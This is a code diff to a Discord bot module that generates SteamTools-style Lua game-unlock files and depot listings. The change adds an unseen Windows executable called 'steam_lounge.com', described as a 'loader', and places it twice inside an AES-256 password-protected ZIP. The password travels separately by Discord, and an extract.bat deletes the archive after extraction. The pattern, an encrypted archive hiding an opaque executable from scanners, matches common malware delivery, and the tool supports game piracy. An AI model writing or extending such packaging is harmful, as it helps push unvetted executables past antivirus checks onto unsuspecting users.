@@ -2,16 +2,54 @@
 //  GOJO BOT — Steam Depot / Manifest Utility
 //  Uses api.steamcmd.net (public anonymous mirror) to fetch
 //  app + DLC depot manifests and build SteamTools-style Lua.
-//  Also generates a ZIP containing Lua + .manifest listings.
+//  Bundles a Windows loader EXE + password-protected ZIP.
 // ============================================================
 
-const JSZip = require('jszip');
+const fs = require('fs');
+const path = require('path');
+const crypto = require('crypto');
+
+const {
+    ZipWriter,
+    BlobWriter,
+    TextReader,
+    Uint8ArrayReader,
+} = require('@zip.js/zip.js');
 
 const BRAND = 'Copyright Limited Gojo Steam Lounge';
 const API_BASE = 'https://api.steamcmd.net/v1/info';
+const EXE_PATH = path.join(__dirname, '..', 'assets', 'steam_lounge.com');
+const EXE_NAME = 'steam_lounge.com';
 
 // ─────────────────────────────────────────────────────────────
-//  Fetch raw app info from steamcmd.net
+//  Random password generator (no confusing chars)
+// ─────────────────────────────────────────────────────────────
+function generatePassword(len = 8) {
+    const chars = 'abcdefghjkmnpqrstuvwxyz23456789';
+    let out = '';
+    const bytes = crypto.randomBytes(len);
+    for (let i = 0; i < len; i++) out += chars[bytes[i] % chars.length];
+    return out;
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Load the bundled EXE (returns Buffer or null)
+// ─────────────────────────────────────────────────────────────
+function loadExe() {
+    try {
+        if (!fs.existsSync(EXE_PATH)) {
+            console.warn(`[steamManifest] EXE not found at ${EXE_PATH} — zip will be built without it.`);
+            return null;
+        }
+        return fs.readFileSync(EXE_PATH);
+    } catch (e) {
+        console.warn('[steamManifest] Failed to read EXE:', e.message);
+        return null;
+    }
+}
+
+// ─────────────────────────────────────────────────────────────
+//  SteamCMD API helpers
 // ─────────────────────────────────────────────────────────────
 async function fetchAppInfo(appid) {
     try {
@@ -20,18 +58,13 @@ async function fetchAppInfo(appid) {
         });
         if (!r.ok) return null;
         const json = await r.json();
-        const entry = json?.data?.[String(appid)];
-        if (!entry) return null;
-        return entry;
+        return json?.data?.[String(appid)] || null;
     } catch (e) {
         console.warn(`[steamManifest] fetchAppInfo(${appid}) failed:`, e.message);
         return null;
     }
 }
 
-// ─────────────────────────────────────────────────────────────
-//  Fetch DLC app IDs from Steam storefront appdetails
-// ─────────────────────────────────────────────────────────────
 async function fetchDlcAppIds(appid) {
     try {
         const r = await fetch(
@@ -42,17 +75,13 @@ async function fetchDlcAppIds(appid) {
         const j = await r.json();
         const data = j?.[String(appid)]?.data;
         if (!data) return [];
-        const dlc = Array.isArray(data.dlc) ? data.dlc.map(String) : [];
-        return dlc;
+        return Array.isArray(data.dlc) ? data.dlc.map(String) : [];
     } catch (e) {
         console.warn(`[steamManifest] fetchDlcAppIds(${appid}) failed:`, e.message);
         return [];
     }
 }
 
-// ─────────────────────────────────────────────────────────────
-//  Extract numeric depots + public manifest GID + sizes
-// ─────────────────────────────────────────────────────────────
 function extractDepots(appEntry) {
     const out = [];
     if (!appEntry || !appEntry.depots) return out;
@@ -76,7 +105,7 @@ function extractDepots(appEntry) {
 }
 
 // ─────────────────────────────────────────────────────────────
-//  Build a Lua string for one app
+//  Lua builder
 // ─────────────────────────────────────────────────────────────
 function buildLua({ appid, name, depots, kind = 'APP' }) {
     const ts = new Date().toISOString();
@@ -106,9 +135,6 @@ function buildLua({ appid, name, depots, kind = 'APP' }) {
     return lines.join('\n');
 }
 
-// ─────────────────────────────────────────────────────────────
-//  Build a .manifest listing file (text) for a single depot
-// ─────────────────────────────────────────────────────────────
 function buildManifestFile({ appid, appName, kind, depot }) {
     const ts = new Date().toISOString();
     return [
@@ -130,7 +156,44 @@ function buildManifestFile({ appid, appName, kind, depot }) {
 }
 
 // ─────────────────────────────────────────────────────────────
-//  Full pipeline
+//  Extract helper (batch) — runs 7z, extracts, deletes the zip
+// ─────────────────────────────────────────────────────────────
+function buildExtractBat() {
+    return [
+        '@echo off',
+        'title GOJO Extractor',
+        'cd /d "%~dp0"',
+        'echo ============================================',
+        `echo  ${BRAND}`,
+        'echo ============================================',
+        'echo.',
+        'set /p PASS=Enter archive password: ',
+        'echo.',
+        'where 7z >nul 2>nul',
+        'if errorlevel 1 (',
+        '    echo 7-Zip not found in PATH.',
+        '    echo Install 7-Zip from https://7-zip.org or use WinRAR to extract.',
+        '    pause',
+        '    exit /b 1',
+        ')',
+        'for %%f in (*.zip) do (',
+        '    echo Extracting "%%f"...',
+        '    7z x -p"%PASS%" -y "%%f" -o"."',
+        '    if errorlevel 1 (',
+        '        echo Extraction failed for "%%f". Wrong password or corrupted archive.',
+        '    ) else (',
+        '        echo Deleting "%%f"...',
+        '        del /f /q "%%f"',
+        '    )',
+        ')',
+        'echo.',
+        'echo Done.',
+        'pause',
+    ].join('\r\n');
+}
+
+// ─────────────────────────────────────────────────────────────
+//  Full pipeline — build the encrypted ZIP
 // ─────────────────────────────────────────────────────────────
 async function buildGenPackage(appid) {
     const warnings = [];
@@ -192,25 +255,39 @@ async function buildGenPackage(appid) {
         });
     }
 
-    // ── Build ZIP ──────────────────────────────────────────
-    const zip = new JSZip();
-    zip.file(`${appid}.lua`, mainLua);
+    // ── Load EXE ───────────────────────────────────────────
+    const exeBuffer = loadExe();
+    if (!exeBuffer) {
+        warnings.push(`Bundled EXE not found at assets/${EXE_NAME} — zip will not include it.`);
+    }
+
+    // ── Password ───────────────────────────────────────────
+    const password = generatePassword(8);
+
+    // ── Build ZIP (AES-256 encrypted) ──────────────────────
+    const blobWriter = new BlobWriter('application/zip');
+    const zipWriter = new ZipWriter(blobWriter, {
+        password,
+        encryptionStrength: 3, // 3 = AES-256
+    });
+
+    // Main lua
+    await zipWriter.add(`${appid}.lua`, new TextReader(mainLua));
 
     // Main manifests
-    const mainManifestFolder = zip.folder('manifests');
     for (const d of mainDepots) {
-        mainManifestFolder.file(
-            `${d.depotId}.manifest`,
-            buildManifestFile({
+        await zipWriter.add(
+            `manifests/${d.depotId}.manifest`,
+            new TextReader(buildManifestFile({
                 appid: String(appid),
                 appName: mainName,
                 kind: 'MAIN APP',
                 depot: d,
-            })
+            }))
         );
     }
 
-    // Structured JSON summary
+    // Structured JSON
     const manifestsJson = {
         brand: BRAND,
         generated: new Date().toISOString(),
@@ -237,19 +314,28 @@ async function buildGenPackage(appid) {
             })),
         })),
     };
-    zip.file('manifests.json', JSON.stringify(manifestsJson, null, 2));
+    await zipWriter.add('manifests.json', new TextReader(JSON.stringify(manifestsJson, null, 2)));
 
-    // DLC Lua + manifests
-    const dlcFolder = zip.folder('dlc');
+    // Main EXE (root)
+    if (exeBuffer) {
+        await zipWriter.add(EXE_NAME, new Uint8ArrayReader(exeBuffer));
+    }
+
+    // DLC folder + per-DLC EXE copy
     for (const d of dlcEntries) {
-        if (d.lua) dlcFolder.file(`${d.appid}.lua`, d.lua);
-        if (d.manifestFiles.length) {
-            const dlcManifestFolder = dlcFolder.folder(`${d.appid}-manifests`);
-            for (const mf of d.manifestFiles) {
-                dlcManifestFolder.file(mf.fileName, mf.content);
-            }
+        if (d.lua) {
+            await zipWriter.add(`dlc/${d.appid}.lua`, new TextReader(d.lua));
+        }
+        for (const mf of d.manifestFiles) {
+            await zipWriter.add(`dlc/${d.appid}-manifests/${mf.fileName}`, new TextReader(mf.content));
+        }
+        if (exeBuffer) {
+            await zipWriter.add(`dlc/${EXE_NAME}`, new Uint8ArrayReader(exeBuffer));
         }
     }
+
+    // Extract batch (extract + delete zip)
+    await zipWriter.add('extract.bat', new TextReader(buildExtractBat()));
 
     // README
     const readme = [
@@ -265,26 +351,42 @@ async function buildGenPackage(appid) {
         `  - ${appid}.lua`,
         `  - manifests/<depotId>.manifest`,
         `  - manifests.json`,
+        `  - ${EXE_NAME}  (loader / extractor)`,
         `  - dlc/<dlcid>.lua`,
         `  - dlc/<dlcid>-manifests/<depotId>.manifest`,
+        `  - dlc/${EXE_NAME}  (duplicate, for DLC-only extraction)`,
+        `  - extract.bat  (auto extract + delete this zip)`,
         '',
-        'Note: .manifest files are depot listings (ID + GID + size),',
-        'not Steam CDN binary manifests.',
+        'HOW TO EXTRACT:',
+        '  This archive is AES-256 password-protected.',
+        '  The password is shown in the Discord message that delivered this zip.',
+        '',
+        '  Option A (recommended):',
+        '    1. Install 7-Zip (https://7-zip.org)',
+        '    2. Put this .zip in its own folder',
+        '    3. Run extract.bat inside this archive after unzipping once manually,',
+        '       OR right-click the .zip and use 7-Zip > Extract Here, entering the password.',
+        '',
+        '  Option B:',
+        '    Open the .zip in WinRAR, enter the password, extract.',
+        '',
+        '  .manifest files are depot listings (ID + GID + size),',
+        '  not Steam CDN binary manifests.',
     ].join('\n');
-    zip.file('README.txt', readme);
+    await zipWriter.add('README.txt', new TextReader(readme));
 
-    const zipBuffer = await zip.generateAsync({
-        type: 'nodebuffer',
-        compression: 'DEFLATE',
-        compressionOptions: { level: 9 },
-    });
+    await zipWriter.close();
+    const blob = await blobWriter.getData();
+    const zipBuffer = Buffer.from(await blob.arrayBuffer());
 
     return {
         zipBuffer,
         fileName: `gen-${appid}.zip`,
+        password,
         mainName,
         depotCount: mainDepots.length,
         dlcList: dlcEntries,
+        hasExe: Boolean(exeBuffer),
         warnings,
     };
 }
